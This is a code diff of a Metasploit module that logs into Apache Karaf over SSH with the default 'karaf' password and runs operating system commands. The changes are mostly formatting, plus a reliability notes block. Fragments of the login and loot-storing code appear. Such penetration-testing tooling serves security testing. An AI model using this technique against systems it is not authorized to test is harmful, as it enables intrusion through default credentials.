@@ -10,23 +10,31 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::SSH
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Apache Karaf Default Credentials Command Execution",
-      'Description'    => %q{
-        This module exploits a default misconfiguration flaw on Apache Karaf versions 2.x-4.x.
-        The 'karaf' user has a known default password, which can be used to login to the
-        SSH service, and execute operating system commands from remote.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "Apache Karaf Default Credentials Command Execution",
+        'Description' => %q{
+          This module exploits a default misconfiguration flaw on Apache Karaf versions 2.x-4.x.
+          The 'karaf' user has a known default password, which can be used to login to the
+          SSH service, and execute operating system commands from remote.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Nicholas Starke <nick@alephvoid.com>'
         ],
-      'Platform'       => 'unix',
-      'Arch'           => ARCH_CMD,
-      'Privileged'     => true,
-      'DisclosureDate' => '2016-02-09'))
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Privileged' => true,
+        'DisclosureDate' => '2016-02-09',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -64,9 +72,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def do_login(user, pass, ip)
     opts = ssh_client_defaults.merge({
-      :auth_methods    => ['password'],
-      :port            => rport,
-      :password        => pass,
+      :auth_methods => ['password'],
+      :port => rport,
+      :password => pass,
     })
 
     opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
@@ -109,9 +117,9 @@ class MetasploitModule < Msf::Auxiliary
       if output
         print_good("#{ip}:#{rport} - Command successfully executed.  Output: #{output}")
         store_loot("apache.karaf.command",
-                "text/plain",
-                ip,
-                output)
+                   "text/plain",
+                   ip,
+                   output)
         vprint_status("#{ip}:#{rport} - Loot stored at: apache.karaf.command")
       else
         print_error "#{ip}:#{rport} - Command failed to execute"
